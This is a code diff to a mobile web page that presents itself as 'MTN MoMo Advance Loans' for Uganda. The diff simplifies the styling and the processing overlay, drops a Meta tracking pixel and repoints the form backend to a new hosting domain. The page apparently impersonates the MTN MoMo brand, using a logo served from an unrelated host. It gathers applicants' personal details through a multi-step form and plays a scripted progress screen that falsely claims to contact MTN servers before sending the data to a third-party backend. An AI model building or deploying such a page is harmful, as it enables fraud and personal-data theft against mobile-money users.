@@ -4,29 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <meta name="theme-color" content="#000000">
-  <title>MTN MoMo – Easy Loans | Uganda</title>
+  <title>MTN MoMo – MoMo Advance Loans | Uganda</title>
 
   <!-- ============================================
-       META PIXEL — BASE CODE
-       Pixel ID: 2204599977605917
-       ============================================ -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '2204599977605917');
-    fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=2204599977605917&ev=PageView&noscript=1"
-  /></noscript>
-  <!-- ============================================
-       END META PIXEL
+       META PIXEL — ADD LATER
+       (No pixel configured for Uganda yet)
        ============================================ -->
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -68,7 +50,7 @@
       -moz-osx-font-smoothing: grayscale;
     }
 
-    /* ═══════════ PAGE SYSTEM ═══════════ */
+    /* PAGE SYSTEM */
     .page { display: none; min-height: 100vh; width: 100%; }
     .page.active { display: flex; flex-direction: column; animation: pageIn 0.4s cubic-bezier(0.22, 1, 0.36, 1); }
     @keyframes pageIn {
@@ -76,7 +58,7 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    /* ═══════════ HEADER — BLACK ═══════════ */
+    /* NAVBAR */
     .navbar {
       background: var(--black);
       display: flex;
@@ -90,45 +72,37 @@
       box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
       z-index: 10;
     }
-    .nav-inner {
-      max-width: 1200px;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      position: relative;
-    }
+
     .nav-left {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s;
       background: rgba(255, 255, 255, 0.08);
       border: 1px solid rgba(255, 255, 255, 0.14);
-      color: rgba(255, 255, 255, 0.9);
-      font-size: 0.82rem;
-      font-weight: 700;
       font-family: 'Inter', sans-serif;
       padding: 8px 14px;
       border-radius: 50px;
-      cursor: pointer;
       display: flex;
       align-items: center;
       gap: 6px;
-      transition: background 0.2s;
     }
     .nav-left:hover {
       background: rgba(255, 255, 255, 0.18);
       color: #fff;
     }
-    .nav-left.hidden { visibility: hidden; }
 
     .brand {
       display: flex;
       align-items: center;
       gap: 10px;
-      text-decoration: none;
-      color: inherit;
-      position: absolute;
-      left: 50%;
-      transform: translateX(-50%);
+      cursor: pointer;
     }
     .brand-logo-img { height: 48px; width: auto; display: block; }
     .brand-divider {
@@ -144,18 +118,15 @@
       letter-spacing: 0.5px;
       white-space: nowrap;
     }
-    .nav-right {
-      width: 42px;
-      height: 42px;
-    }
 
-    /* ═══════════ HERO ═══════════ */
+    /* HERO */
     .hero {
       width: 100%;
       max-width: 480px;
       margin: 20px auto 0;
       padding: 0 16px;
     }
+
     .hero-card {
       background: var(--grad-gold);
       border-radius: var(--radius-lg);
@@ -183,6 +154,7 @@
       border-radius: 50%;
       pointer-events: none;
     }
+
     .hero-badge {
       display: inline-flex;
       align-items: center;
@@ -200,8 +172,7 @@
       position: relative;
     }
     .hero-badge .pulse-dot {
-      width: 6px;
-      height: 6px;
+      width: 6px; height: 6px;
       border-radius: 50%;
       background: #16A34A;
       box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.6);
@@ -211,6 +182,7 @@
       0% { box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.6); }
       100% { box-shadow: 0 0 0 10px rgba(22, 163, 74, 0); }
     }
+
     .hero-title {
       font-size: 1.6rem;
       font-weight: 900;
@@ -220,6 +192,13 @@
       position: relative;
       color: #003366;
     }
+    .hero-title .gold {
+      display: inline-block;
+      background: linear-gradient(135deg, #003366 0%, #004080 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
     .hero-title .highlight {
       color: #7A5C00;
       background: linear-gradient(135deg, #7A5C00 0%, #A87D00 100%);
@@ -228,6 +207,7 @@
       background-clip: text;
       font-style: italic;
     }
+
     .hero-sub {
       font-size: 0.88rem;
       color: #5C4A00;
@@ -264,7 +244,7 @@
       text-transform: uppercase;
     }
 
-    /* ═══════════ CALCULATOR ═══════════ */
+    /* CALCULATOR */
     .calc-card {
       background: #fff;
       border-radius: var(--radius-lg);
@@ -299,6 +279,7 @@
       font-size: 1rem;
       font-weight: 800;
       color: var(--text-dark);
+      letter-spacing: -0.01em;
       line-height: 1.1;
     }
     .calc-head-title-sub {
@@ -449,6 +430,7 @@
       padding: 16px 12px;
       text-align: center;
       border: 1px solid #EEF2FB;
+      position: relative;
     }
     .stat-box .ico {
       font-size: 1rem;
@@ -477,7 +459,7 @@
     }
     .stat-box.highlight .val { color: #7A5C00; }
 
-    /* ═══════════ CTA ═══════════ */
+    /* CTA */
     .cta-wrap {
       width: 100%;
       max-width: 480px;
@@ -531,10 +513,9 @@
       align-items: center;
       justify-content: center;
       gap: 6px;
-      font-weight: 600;
     }
 
-    /* ═══════════ PROGRESS BAR ═══════════ */
+    /* PROGRESS */
     .progress-wrap {
       width: 100%;
       max-width: 480px;
@@ -584,7 +565,7 @@
       box-shadow: 0 0 12px rgba(255, 204, 0, 0.5);
     }
 
-    /* ═══════════ FORM ═══════════ */
+    /* FORM */
     .form-wrap {
       width: 100%;
       max-width: 480px;
@@ -599,6 +580,7 @@
       box-shadow: 0 8px 28px rgba(0, 25, 60, 0.08);
       border: 1px solid rgba(0, 51, 102, 0.05);
     }
+
     .section-head {
       display: flex;
       align-items: center;
@@ -608,7 +590,8 @@
       border-bottom: 1px solid #EEF2FB;
     }
     .section-head .ico {
-      width: 34px; height: 34px;
+      width: 34px;
+      height: 34px;
       border-radius: 10px;
       background: linear-gradient(135deg, #F7F9FF 0%, #EEF3FF 100%);
       display: flex;
@@ -689,13 +672,16 @@
       padding-right: 44px;
     }
     .form-field textarea { resize: vertical; min-height: 100px; line-height: 1.55; }
+
     .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
     .form-hint {
       font-size: 0.72rem;
       color: var(--text-light);
       margin-top: 8px;
       font-weight: 600;
     }
+
     .field-error {
       font-size: 0.72rem;
       color: var(--error);
@@ -741,7 +727,7 @@
     .btn-outline:active { transform: scale(0.98); }
     .btn-primary.auto-flex { flex: 1; width: auto; padding: 16px 20px; }
 
-    /* ═══════════ SUMMARY BOX ═══════════ */
+    /* SUMMARY */
     .summary-box {
       background: linear-gradient(135deg, #FFFBEB 0%, #FFF8DC 100%);
       border: 1px solid #FFE999;
@@ -792,212 +778,123 @@
       word-break: break-word;
     }
 
-    /* ═══════════ PROCESSING OVERLAY ═══════════ */
+    /* PROCESSING OVERLAY */
     .processing-overlay {
       position: fixed;
       inset: 0;
-      background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
+      background: var(--grad);
       display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 32px 24px;
-      z-index: 10000;
+      z-index: 3000;
+      text-align: center;
+      color: white;
       overflow: hidden;
     }
-    .processing-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
+    .processing-overlay.show { display: flex; }
     .processing-overlay::before {
       content: '';
       position: absolute;
-      top: 50%; left: 50%;
-      width: 700px; height: 700px;
-      transform: translate(-50%, -50%);
-      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
-      animation: glowPulse 3s ease-in-out infinite;
+      top: 10%; right: -100px;
+      width: 350px; height: 350px;
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 70%);
+      border-radius: 50%;
       pointer-events: none;
     }
-    @keyframes glowPulse {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
-      50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
-    }
 
-    .processing-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
-    .processing-particle {
-      position: absolute;
-      width: 4px; height: 4px;
-      background: var(--mtn-gold);
-      border-radius: 50%;
-      opacity: 0;
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
-      animation: particleFloat 8s infinite ease-in-out;
-    }
-    .processing-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
-    .processing-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
-    .processing-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
-    .processing-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
-    .processing-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
-    .processing-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
-    .processing-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
-    .processing-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
-    @keyframes particleFloat {
-      0% { opacity: 0; transform: translateY(0) scale(0.6); }
-      15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
-      80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
-      100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
-    }
-
-    .processing-content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      max-width: 340px;
-      text-align: center;
-      position: relative;
-      z-index: 2;
-    }
-    .processing-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
-    .processing-orbit-ring {
-      position: absolute;
-      inset: 0;
-      border-radius: 50%;
-      border: 2px dashed rgba(255, 204, 0, 0.35);
-      animation: rotateSlow 10s linear infinite;
-    }
-    .processing-orbit-ring.inner {
-      inset: 22px;
-      border: 1.5px dashed rgba(255, 204, 0, 0.55);
-      animation: rotateSlow 6s linear infinite reverse;
-    }
-    @keyframes rotateSlow { to { transform: rotate(360deg); } }
-    .processing-orbit-core {
-      position: absolute;
-      top: 50%; left: 50%;
-      width: 72px; height: 72px;
-      transform: translate(-50%, -50%);
-      border-radius: 18px;
+    .processing-logo {
+      width: 90px;
+      height: 90px;
       background: var(--grad-gold);
+      border-radius: 22px;
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
-      animation: corePulse 2s ease-in-out infinite;
-      padding: 8px;
+      margin-bottom: 30px;
+      box-shadow: 0 16px 40px rgba(255, 204, 0, 0.4);
+      animation: floatUp 2.4s ease-in-out infinite;
+      padding: 10px;
     }
-    .processing-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
-    @keyframes corePulse {
-      0%, 100% {
-        box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
-        transform: translate(-50%, -50%) scale(1);
-      }
-      50% {
-        box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5);
-        transform: translate(-50%, -50%) scale(1.06);
-      }
+    .processing-logo img { width: 100%; height: 100%; object-fit: contain; }
+    @keyframes floatUp {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
     }
-    .processing-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
-    .processing-dot-orbit span {
+
+    .processing-ring {
+      position: relative;
+      width: 76px;
+      height: 76px;
+      margin-bottom: 26px;
+    }
+    .processing-ring svg {
+      width: 76px;
+      height: 76px;
+      transform: rotate(-90deg);
+    }
+    .processing-ring .bg {
+      fill: none;
+      stroke: rgba(255, 204, 0, 0.15);
+      stroke-width: 6;
+    }
+    .processing-ring .fg {
+      fill: none;
+      stroke: var(--mtn-gold);
+      stroke-width: 6;
+      stroke-linecap: round;
+      stroke-dasharray: 213;
+      stroke-dashoffset: 213;
+      transition: stroke-dashoffset 0.4s ease;
+      filter: drop-shadow(0 0 8px rgba(255, 204, 0, 0.6));
+    }
+    .processing-pct {
       position: absolute;
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: var(--mtn-gold);
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--mtn-gold);
     }
-    .processing-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
-    .processing-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
-    .processing-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
-    .processing-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
     .processing-title {
-      font-size: 20px;
+      font-size: 1.3rem;
       font-weight: 800;
       color: #fff;
       margin-bottom: 10px;
-      line-height: 1.35;
-      letter-spacing: -0.3px;
-    }
-    .processing-title .highlight {
-      background: linear-gradient(90deg, #FFCC00, #FFD633);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
+      min-height: 1.6rem;
     }
     .processing-sub {
-      font-size: 13.5px;
+      font-size: 0.85rem;
       color: rgba(255, 255, 255, 0.7);
-      line-height: 1.6;
-      margin-bottom: 30px;
+      margin-bottom: 24px;
+      min-height: 1.2rem;
       font-weight: 500;
-      min-height: 1.4em;
+      max-width: 320px;
     }
-    .processing-bar {
-      width: 240px;
-      height: 6px;
-      background: rgba(255, 204, 0, 0.12);
-      border-radius: 4px;
-      overflow: hidden;
-      margin-bottom: 30px;
-      position: relative;
-    }
-    .processing-bar-fill {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
-      background-size: 200% 100%;
-      border-radius: 4px;
-      transition: width 0.4s ease;
-      box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
-      animation: shimmer 2s linear infinite;
-    }
-    @keyframes shimmer {
-      0% { background-position: 200% 0; }
-      100% { background-position: -200% 0; }
-    }
-    .processing-step {
-      position: relative;
-      height: 20px;
-      overflow: hidden;
-      margin-bottom: 20px;
-      width: 100%;
-    }
-    .processing-step-inner {
+    .processing-dots {
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+      gap: 6px;
+      justify-content: center;
+      margin-top: 8px;
     }
-    .processing-step-text {
-      height: 20px;
-      line-height: 20px;
-      font-size: 12px;
-      color: rgba(255, 204, 0, 0.9);
-      font-weight: 700;
-      letter-spacing: 0.03em;
-    }
-    .processing-status-row {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 11.5px;
-      color: rgba(255, 255, 255, 0.5);
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-    }
-    .processing-status-dot {
-      width: 7px; height: 7px;
+    .processing-dots span {
+      width: 8px; height: 8px;
+      background: var(--mtn-gold);
       border-radius: 50%;
-      background: #22C55E;
-      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
-      animation: statusPulse 1.6s ease-in-out infinite;
+      animation: dotBounce 1.2s infinite both;
     }
-    @keyframes statusPulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.85); }
+    .processing-dots span:nth-child(1) { animation-delay: 0s; }
+    .processing-dots span:nth-child(2) { animation-delay: 0.15s; }
+    .processing-dots span:nth-child(3) { animation-delay: 0.3s; }
+    @keyframes dotBounce {
+      0%, 80%, 100% { opacity: 0.25; transform: scale(0.7); }
+      40% { opacity: 1; transform: scale(1.1); }
     }
 
-    /* ═══════════ MOBILE ═══════════ */
     @media (max-width: 480px) {
       .hero, .cta-wrap, .progress-wrap, .form-wrap { padding-left: 14px; padding-right: 14px; }
       .hero-card { padding: 24px 18px 22px; }
@@ -1011,14 +908,12 @@
       .navbar { height: 68px; padding: 0 14px; }
       .brand-logo-img { height: 42px; }
       .brand-sub { font-size: 11px; }
-      .processing-orbit { width: 120px; height: 120px; }
-      .processing-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
-      .processing-title { font-size: 18px; }
       .calc-head-ico, .section-head .ico { width: 30px; height: 30px; font-size: 0.95rem; }
     }
     @media (max-width: 380px) {
       .form-card { padding: 20px 14px; }
       .hero-title { font-size: 1.3rem; }
+      .brand-logo-img { height: 38px; }
       .brand-sub { display: none; }
       .brand-divider { display: none; }
     }
@@ -1028,17 +923,13 @@
 
   <div id="app">
 
-    <!-- ═══════════ WELCOME ═══════════ -->
+    <!-- WELCOME -->
     <div id="page-welcome" class="page active">
       <div class="navbar">
-        <div class="nav-inner">
-          <button class="nav-left hidden">← Back</button>
-          <a href="index.html" class="brand">
-            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
-            <div class="brand-divider"></div>
-            <span class="brand-sub">MoMo Advance Loans</span>
-          </a>
-          <div class="nav-right"></div>
+        <div class="brand">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+          <div class="brand-divider"></div>
+          <span class="brand-sub">MoMo Advance Loans</span>
         </div>
       </div>
 
@@ -1051,7 +942,7 @@
           <h1 class="hero-title">
             Quick <span class="highlight">MoMo Advance</span> Loans
             <br>
-            Get it Instantly
+            <span class="gold">Get it Instantly</span>
           </h1>
           <p class="hero-sub">
             Money in your pocket in just <span class="em">minutes</span>.
@@ -1132,17 +1023,14 @@
       </div>
     </div>
 
-    <!-- ═══════════ STEP 1 ═══════════ -->
+    <!-- STEP 1 -->
     <div id="page-step1" class="page">
       <div class="navbar">
-        <div class="nav-inner">
-          <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
-          <a href="index.html" class="brand">
-            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
-            <div class="brand-divider"></div>
-            <span class="brand-sub">MoMo Advance Loans</span>
-          </a>
-          <div class="nav-right"></div>
+        <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
+        <div class="brand">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+          <div class="brand-divider"></div>
+          <span class="brand-sub">MoMo Advance Loans</span>
         </div>
       </div>
 
@@ -1208,17 +1096,14 @@
       </div>
     </div>
 
-    <!-- ═══════════ STEP 2 ═══════════ -->
+    <!-- STEP 2 -->
     <div id="page-step2" class="page">
       <div class="navbar">
-        <div class="nav-inner">
-          <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
-          <a href="index.html" class="brand">
-            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
-            <div class="brand-divider"></div>
-            <span class="brand-sub">MoMo Advance Loans</span>
-          </a>
-          <div class="nav-right"></div>
+        <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
+        <div class="brand">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+          <div class="brand-divider"></div>
+          <span class="brand-sub">MoMo Advance Loans</span>
         </div>
       </div>
 
@@ -1274,17 +1159,14 @@
       </div>
     </div>
 
-    <!-- ═══════════ STEP 3 ═══════════ -->
+    <!-- STEP 3 -->
     <div id="page-step3" class="page">
       <div class="navbar">
-        <div class="nav-inner">
-          <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
-          <a href="index.html" class="brand">
-            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
-            <div class="brand-divider"></div>
-            <span class="brand-sub">MoMo Advance Loans</span>
-          </a>
-          <div class="nav-right"></div>
+        <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
+        <div class="brand">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+          <div class="brand-divider"></div>
+          <span class="brand-sub">MoMo Advance Loans</span>
         </div>
       </div>
 
@@ -1350,65 +1232,37 @@
 
   </div>
 
-  <!-- ═══════════ SUPER PROCESSING OVERLAY ═══════════ -->
+  <!-- PROCESSING OVERLAY -->
   <div class="processing-overlay" id="processingOverlay">
-    <div class="processing-particles">
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
-      <span class="processing-particle"></span>
+    <div class="processing-logo">
+      <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
     </div>
 
-    <div class="processing-content">
-      <div class="processing-orbit">
-        <div class="processing-orbit-ring"></div>
-        <div class="processing-orbit-ring inner"></div>
-        <div class="processing-dot-orbit">
-          <span></span><span></span><span></span><span></span>
-        </div>
-        <div class="processing-orbit-core">
-          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
-        </div>
-      </div>
+    <div class="processing-ring">
+      <svg viewBox="0 0 76 76">
+        <circle class="bg" cx="38" cy="38" r="34"/>
+        <circle class="fg" id="progressRing" cx="38" cy="38" r="34"/>
+      </svg>
+      <div class="processing-pct" id="progressPct">0%</div>
+    </div>
 
-      <h2 class="processing-title" id="procTitle">
-        Processing your <span class="highlight">application</span>
-      </h2>
-      <p class="processing-sub" id="procSub">Please wait, this may take a few seconds…</p>
+    <div class="processing-title" id="procTitle">Processing Application</div>
+    <div class="processing-sub" id="procSub">Please wait, this may take a few seconds</div>
 
-      <div class="processing-bar">
-        <div class="processing-bar-fill" id="procBarFill"></div>
-      </div>
-
-      <div class="processing-step">
-        <div class="processing-step-inner" id="procStepInner">
-          <div class="processing-step-text">🔍 Reviewing your details</div>
-          <div class="processing-step-text">📡 Contacting MTN MoMo servers</div>
-          <div class="processing-step-text">🔐 Verifying your information</div>
-          <div class="processing-step-text">⏳ Preparing your offer</div>
-        </div>
-      </div>
-
-      <div class="processing-status-row">
-        <span class="processing-status-dot"></span>
-        <span>Live · Secure Connection</span>
-      </div>
+    <div class="processing-dots">
+      <span></span><span></span><span></span>
     </div>
   </div>
 
   <script>
-    window.API_BASE = 'https://easy-loansej1-production.up.railway.app';
+    window.API_BASE = 'https://momo-advance-loan-uganda.onrender.com';
   </script>
 
   <script>
-    // ═══ State ═══
+    /* State */
     const S = { loanAmount: 1000000, loanTerm: '48 Months' };
 
-    // ═══ Navigation ═══
+    /* Navigation */
     function goTo(pageId) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
       const target = document.getElementById(pageId);
@@ -1416,7 +1270,7 @@
       window.scrollTo(0, 0);
     }
 
-    // ═══ Number formatting ═══
+    /* Number formatting */
     function fmtNum(n) { return Number(n).toLocaleString('en-US'); }
     function parseNum(str) { return parseInt(String(str).replace(/[^\d]/g, ''), 10) || 0; }
 
@@ -1436,7 +1290,7 @@
       });
     }
 
-    // ═══ Quick amount chips ═══
+    /* Quick amount chips */
     const quickChips = document.querySelectorAll('.quick-chip');
     quickChips.forEach(chip => {
       chip.addEventListener('click', () => {
@@ -1456,7 +1310,7 @@
       });
     }
 
-    // ═══ Calculator ═══
+    /* Calculator */
     function updateCalculator() {
       const slider = document.getElementById('wSlider');
       const amountEl = document.getElementById('wAmount');
@@ -1482,7 +1336,7 @@
       goTo('page-step1');
     }
 
-    // ═══ Error helpers ═══
+    /* Error helpers */
     function showErr(inputId, errId) {
       const input = document.getElementById(inputId);
       const err = document.getElementById(errId);
@@ -1500,7 +1354,6 @@
       });
     });
 
-    // ═══ Step 1 → Step 2 ═══
     function nextToStep2() {
       let ok = true;
       const amount = parseNum(document.getElementById('fAmount').value);
@@ -1513,7 +1366,6 @@
       goTo('page-step2');
     }
 
-    // ═══ Step 2 → Step 3 ═══
     function nextToStep3() {
       let ok = true;
       const first = document.getElementById('fFirst').value.trim();
@@ -1538,31 +1390,42 @@
       goTo('page-step3');
     }
 
-    // ═══ Processing overlay animation ═══
     function runProcessingAnimation(durationMs) {
-      const barFill = document.getElementById('procBarFill');
-      const stepInner = document.getElementById('procStepInner');
+      const ring = document.getElementById('progressRing');
+      const pct = document.getElementById('progressPct');
+      const title = document.getElementById('procTitle');
+      const sub = document.getElementById('procSub');
 
-      // Rotating status messages
-      let stepIndex = 0;
-      const stepTimer = setInterval(() => {
-        stepIndex = (stepIndex + 1) % 4;
-        stepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
-      }, 1400);
+      const statuses = [
+        { at: 0,   title: 'Processing Application', sub: 'Please wait, this may take a few seconds' },
+        { at: 25,  title: 'Verifying Details',      sub: 'Checking your information securely' },
+        { at: 50,  title: 'Contacting MTN MoMo',    sub: 'Reviewing your loan request' },
+        { at: 75,  title: 'Preparing Your Offer',   sub: 'Almost there…' },
+        { at: 100, title: 'Finalizing…',            sub: 'Getting everything ready for you' }
+      ];
 
       const start = Date.now();
+      const CIRC = 213;
+
       const timer = setInterval(() => {
         const elapsed = Date.now() - start;
         const p = Math.min(100, Math.floor((elapsed / durationMs) * 100));
-        barFill.style.width = p + '%';
-        if (p >= 100) {
-          clearInterval(timer);
-          clearInterval(stepTimer);
+
+        pct.textContent = p + '%';
+        ring.style.strokeDashoffset = CIRC - (CIRC * p) / 100;
+
+        for (let i = statuses.length - 1; i >= 0; i--) {
+          if (p >= statuses[i].at) {
+            title.textContent = statuses[i].title;
+            sub.textContent = statuses[i].sub;
+            break;
+          }
         }
+
+        if (p >= 100) clearInterval(timer);
       }, 60);
     }
 
-    // ═══ Step 3 → Submit ═══
     async function submitApplication() {
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
@@ -1583,15 +1446,14 @@
       S.loanAmount = payload.loanAmount;
       S.loanTerm = payload.loanTerm;
 
-      // Meta Pixel — Lead event
+      /* META PIXEL — Add later when Uganda pixel is ready */
       if (typeof fbq === 'function') {
         fbq('track', 'Lead', {
-          content_name: 'MoMo Loan Application',
+          content_name: 'MoMo Loan Application UG',
           content_category: payload.loanType,
           value: payload.loanAmount,
           currency: 'UGX'
         });
-        console.log('✅ Meta Pixel: Lead event fired');
       }
 
       document.getElementById('processingOverlay').classList.add('show');
@@ -1620,7 +1482,6 @@
       }, remaining);
     }
 
-    // ═══ Init ═══
     document.addEventListener('DOMContentLoaded', () => {
       if (document.getElementById('wSlider')) updateCalculator();
     });
